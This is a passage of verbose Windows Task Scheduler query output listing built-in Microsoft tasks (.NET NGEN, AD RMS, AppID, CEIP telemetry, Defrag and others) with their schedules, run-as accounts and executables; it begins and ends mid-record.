Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At idle time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At idle time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Active Directory Rights Management Services Client
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Automated)
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Updates the AD RMS rights policy templates for the user. This job does not provide a credential prompt if authentication to the template distribution web service on the server fails. In this case, it fails silently.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Everyone
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Daily 
Start Time:                           3:00:00 AM
Start Date:                           11/9/2006
End Date:                             N/A
Days:                                 Every 1 day(s)
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Automated)
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Updates the AD RMS rights policy templates for the user. This job does not provide a credential prompt if authentication to the template distribution web service on the server fails. In this case, it fails silently.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Everyone
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Manual)
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Updates the AD RMS rights policy templates for the user. This job provides a credential prompt if authentication to the template distribution web service on the server fails.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Everyone
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\AppID
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\AppID\PolicyConverter
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\appidpolicyconverter.exe 
Start In:                             N/A
Comment:                              Converts the software restriction policies policy from XML into binary format.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\AppID\SmartScreenSpecific
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:47 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Task that collects data for SmartScreen in Windows
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For 60 minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\AppID\VerifiedPublisherCertStoreCheck
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\appidcertstorecheck.exe 
Start In:                             N/A
Comment:                              Inspects the AppID certificate cache for invalid or revoked certificates.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for 3 minutes, If Not Idle Retry For 1380 minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          LOCAL SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Application Experience
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Next Run Time:                        7/20/2021 4:59:04 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:17:00 AM
Last Result:                          0
Author:                               $(@%SystemRoot%\system32\appraiser.dll,-501)
Task To Run:                          %windir%\system32\compattelrunner.exe 
Start In:                             N/A
Comment:                              $(@%SystemRoot%\system32\appraiser.dll,-502)
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 96:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           3:00:00 AM
Start Date:                           9/1/2008
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Next Run Time:                        7/20/2021 3:19:34 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:17:00 AM
Last Result:                          0
Author:                               $(@%SystemRoot%\system32\appraiser.dll,-501)
Task To Run:                          %windir%\system32\compattelrunner.exe 
Start In:                             N/A
Comment:                              $(@%SystemRoot%\system32\appraiser.dll,-502)
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 96:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Application Experience\ProgramDataUpdater
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:48 AM
Last Result:                          0
Author:                               $(@%SystemRoot%\system32\invagent.dll,-701)
Task To Run:                          %windir%\system32\compattelrunner.exe -maintenance
Start In:                             N/A
Comment:                              $(@%SystemRoot%\system32\invagent.dll,-702)
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Application Experience\StartupAppTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\rundll32.exe Startupscan.dll,SusRunTask
Start In:                             N/A
Comment:                              Scans startup entries and raises notification to the user if there are too many startup entries.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\ApplicationData
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\ApplicationData\appuriverifierdaily
Next Run Time:                        7/20/2021 3:00:00 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\AppHostRegistrationVerifier.exe 
Start In:                             N/A
Comment:                              Verifies AppUriHandler host registrations.
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for 10 minutes, If Not Idle Retry For 60 minutes
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:15:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Daily 
Start Time:                           3:00:00 AM
Start Date:                           4/11/2016
End Date:                             N/A
Days:                                 Every 1 day(s)
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\ApplicationData\appuriverifierinstall
Next Run Time:                        7/24/2021 3:00:00 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\AppHostRegistrationVerifier.exe 
Start In:                             N/A
Comment:                              Verifies AppUriHandler host registrations.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:15:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Weekly
Start Time:                           3:00:00 AM
Start Date:                           4/11/2016
End Date:                             N/A
Days:                                 SAT
Months:                               Every 1 week(s)
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\ApplicationData\appuriverifierinstall
Next Run Time:                        7/24/2021 3:00:00 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\AppHostRegistrationVerifier.exe 
Start In:                             N/A
Comment:                              Verifies AppUriHandler host registrations.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:15:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\ApplicationData\CleanupTemporaryState
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:49 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState
Start In:                             N/A
Comment:                              Cleans up each package's unused temporary files.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\ApplicationData\DsSvcCleanup
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:49 AM
Last Result:                          -2147023143
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\dstokenclean.exe 
Start In:                             N/A
Comment:                              Performs maintenance for the Data Sharing Service.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\AppxDeploymentClient
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\AppxDeploymentClient\Pre-staged app cleanup
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:47 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %windir%\system32\rundll32.exe %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for 15 minutes, If Not Idle Retry For 15 minutes
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Autochk
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Autochk\Proxy
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:55:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
Start In:                             N/A
Comment:                              This task collects and uploads autochk SQM data if opted-in to the Microsoft Customer Experience Improvement Program.
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for 10 minutes, If Not Idle Retry For 525600 minutes
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Bluetooth
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Bluetooth\UninstallDeviceTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft
Task To Run:                          BthUdTask.exe $(Arg0)
Start In:                             N/A
Comment:                              Uninstalls the PnP device associated with the specified Bluetooth service ID
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Chkdsk
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Chkdsk\ProactiveScan
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:48 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              NTFS Volume Health Scan
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Clip
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Clip\License Validation
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %SystemRoot%\system32\ClipUp.exe -p -s -o
Start In:                             N/A
Comment:                              Windows Store legacy license migration task
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\CloudExperienceHost
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\CloudExperienceHost\CreateObjectTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:00:30
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Customer Experience Improvement Program
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Customer Experience Improvement Program\Consolidator
Next Run Time:                        7/19/2021 12:00:00 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:16:59 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %SystemRoot%\System32\wsqmcons.exe 
Start In:                             N/A
Comment:                              If the user has consented to participate in the Windows Customer Experience Improvement Program, this job collects and sends usage data to Microsoft.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           12:00:00 AM
Start Date:                           1/2/2004
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        6 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:49 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              The Kernel CEIP (Customer Experience Improvement Program) task collects additional information about the system and sends this data to Microsoft.  If the user has not consented to participate in Windows CEIP, this task does nothing.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          LOCAL SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:49 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              The USB CEIP (Customer Experience Improvement Program) task collects Universal Serial Bus related statistics and information about your machine and sends it to the Windows Device Connectivity engineering group at Microsoft.  The information received is 
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Data Integrity Scan
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Next Run Time:                        8/5/2021 8:30:58 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:16:58 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Scans fault-tolerant volumes for latent corruptions
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Weekly
Start Time:                           11:00:00 PM
Start Date:                           1/1/2011
End Date:                             N/A
Days:                                 SAT
Months:                               Every 4 week(s)
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Next Run Time:                        8/2/2021 8:21:50 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:16:58 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Scans fault-tolerant volumes for latent corruptions
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Scans fault-tolerant volumes for fast crash recovery
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Defrag
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Defrag\ScheduledDefrag
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:48 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\defrag.exe -c -h -k -g -$
Start In:                             N/A
Comment:                              This task optimizes local storage drives.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Device Information
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Device Information\Device
Next Run Time:                        7/20/2021 3:35:55 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:16:59 AM
